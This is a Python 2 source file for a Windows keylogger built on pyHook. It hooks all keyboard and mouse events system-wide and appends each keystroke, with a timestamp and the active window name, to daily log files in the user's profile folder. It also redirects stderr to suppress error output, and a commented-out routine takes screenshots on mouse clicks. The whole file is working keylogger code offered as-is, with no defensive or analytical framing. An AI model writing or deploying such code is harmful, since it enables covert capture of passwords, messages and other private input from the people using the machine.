import sys
import os
import StringIO
import time
import pythoncom
import pyHook
import ImageGrab

class Keylogger:

    def __init__(self):
        sys.stderr = StringIO.StringIO()
        self.savedir = "%s\\keylogs" % os.getenv("userprofile")
        global keyboard_event
        global mouse_event
        keyboard_event = self.keyboard_event
        mouse_event = self.mouse_event

    def keyboard_event(self, event):
        #Close on "End" keypress
        if event.Key == "End":
            f.close()
            sys.exit()
        #Write key if not valid Ascii
        if event.Ascii == 0:
            f.write("%s %s" % (time.strftime("%H:%M:%S"), event.Key))
            f.write("  [%s]\n" % event.WindowName)
        else:
            f.write("%s '%s'" % (time.strftime("%H:%M:%S"), chr(event.Ascii)))
            f.write("  [%s]\n" % event.WindowName)
        #print "MessageName:", event.MessageName
        #print "Message:", event.Message
        #print "Time:", event.Time
        #print "Window:", event.Window
        #print "WindowName:", event.WindowName
        #print "Key:", event.Key
        #print "KeyID:", event.KeyID
        #print "ScanCode:", event.ScanCode
        #print "Extended:", event.Extended
        #print "Injected:", event.Injected
        #print "Alt", event.Alt
        #print "Transition", event.Transition

        #Return true to pass the event to other handlers
        return True

    def mouse_event(self, event):
        #Save a screenshot
        #img = ImageGrab.grab()
        #saveas=os.path.join(self.savedir, "%s.jpg" % time.strftime("%Y_%m_%d_%a_%H-%M-%S"))
        #img.save(saveas)
    
        f.write("%s Mouse event  [%s]\n" % (time.strftime("%H:%M:%S"), event.WindowName))

    def run(self):
        try:
            os.mkdir(self.savedir)
        except: #If directory already exists
            pass
        try:
            global f
            #Open file with title format "YEAR_MONTH_DAY_DAY"
            f = open("%s\\%s.txt" % (self.savedir,
                     time.strftime("%Y_%m_%d_%a")), 'a')
            #Create a hook manager
            hm = pyHook.HookManager()
            #Watch for all keyboard events
            hm.KeyDown = keyboard_event
            #Watch for mouse clicks
            hm.SubscribeMouseAllButtonsDown(mouse_event)
            #Set the hooks
            hm.HookMouse()
            hm.HookKeyboard()
            #Wait forever
            pythoncom.PumpMessages()
        except ValueError:
            f.close()

if __name__ == "__main__":
    keylog = Keylogger()
    keylog.run()
